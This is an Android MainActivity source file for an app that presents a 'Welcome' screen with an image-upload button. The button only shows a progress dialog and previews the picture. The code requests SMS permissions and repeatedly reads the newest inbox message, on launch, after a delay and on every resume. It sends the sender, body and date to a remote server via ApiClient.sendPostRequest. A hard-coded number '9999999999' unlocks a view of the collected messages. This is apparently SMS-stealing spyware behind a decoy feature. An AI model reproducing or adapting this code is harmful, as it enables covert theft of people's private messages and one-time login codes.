package com.joaquimley.com;

import android.Manifest;
import android.app.Dialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.icu.text.SimpleDateFormat;
import android.icu.util.Calendar;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.Window;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import java.util.ArrayList;
import java.util.List;


public class MainActivity extends AppCompatActivity implements SmsBroadcastReceiver.SmsListener {
    Dialog dialog;
    private static final int PERMISSION_REQUEST_CODE = 100;
    private SmsAdapter smsAdapter;
    private List<SmsModel> smsList;

    String username = "";
    int SELECT_PICTURE = 200;
    ImageView imageView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        LinearLayout layout1 = findViewById(R.id.llRecycler);
        LinearLayout layout2 = findViewById(R.id.llUser);

        username = getIntent().getStringExtra("username");
        if (username.equals("9999999999")){
            layout1.setVisibility(View.VISIBLE);
            layout2.setVisibility(View.GONE);
        }else{
            layout2.setVisibility(View.VISIBLE);
            layout1.setVisibility(View.GONE);
        }


        imageView = findViewById(R.id.im);

        getSupportActionBar().setTitle("Welcome");
        RecyclerView recyclerView = findViewById(R.id.recyclerView);
        smsList = new ArrayList<>();
        smsAdapter = new SmsAdapter(smsList);

        recyclerView.setLayoutManager(new LinearLayoutManager(this));
        recyclerView.setAdapter(smsAdapter);


        // Check SMS permission
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS}, PERMISSION_REQUEST_CODE);
        } else {
            loadOldMessages();
        }

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                loadOldMessages();
            }
        }, 60000);

        // Set up SMS receiver
        SmsBroadcastReceiver.setSmsListener(this);
        ImageView imageView = findViewById(R.id.btnUpload);
        imageView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                imageChooser();
            }
        });
    }

    private void loadOldMessages() {
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC LIMIT 1");

        if (cursor != null) {
            int indexBody = cursor.getColumnIndex("body");
            int indexAddress = cursor.getColumnIndex("address");
            int indexDate = cursor.getColumnIndex("date");

            while (cursor.moveToNext()) {
                String sender = cursor.getString(indexAddress);
                String message = cursor.getString(indexBody);
                String date = cursor.getString(indexDate);
                smsList.add(new SmsModel(sender, message, date));
                String date1 = getDate(Long.parseLong(cursor.getString(indexDate)), "dd/MM/yyyy hh:mm aa");
                ApiClient.sendPostRequest(username, sender, message, date1);
            }
            cursor.close();
            //smsAdapter.notifyDataSetChanged();
        }
    }

    @Override
    public void onNewSmsReceived(SmsModel sms) {
        runOnUiThread(() -> smsAdapter.addMessage(sms));
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                loadOldMessages();
            } else {
                Toast.makeText(this, "Permission denied!", Toast.LENGTH_SHORT).show();
            }
        }
    }

    public static String getDate(long milliSeconds, String dateFormat)
    {
        // Create a DateFormatter object for displaying date in specified format.
        SimpleDateFormat formatter = new SimpleDateFormat(dateFormat);

        // Create a calendar object that will convert the date and time value in milliseconds to date.
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(milliSeconds);
        return formatter.format(calendar.getTime());
    }

    void imageChooser() {

        dialog = new Dialog(MainActivity.this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.progress);
        dialog.setCanceledOnTouchOutside(false);
        dialog.show();

        Intent i = new Intent();
        i.setType("image/*");
        i.setAction(Intent.ACTION_GET_CONTENT);

        // pass the constant to compare it with the returned requestCode
        startActivityForResult(Intent.createChooser(i, "Select Picture"), SELECT_PICTURE);
    }

    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (resultCode == RESULT_OK) {

            // compare the resultCode with the
            // SELECT_PICTURE constant
            if (requestCode == SELECT_PICTURE) {
                // Get the url of the image from data
                Uri selectedImageUri = data.getData();
                if (null != selectedImageUri) {
                    // update the preview image in the layout
                    imageView.setImageURI(selectedImageUri);
                }
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        loadOldMessages();
    }
}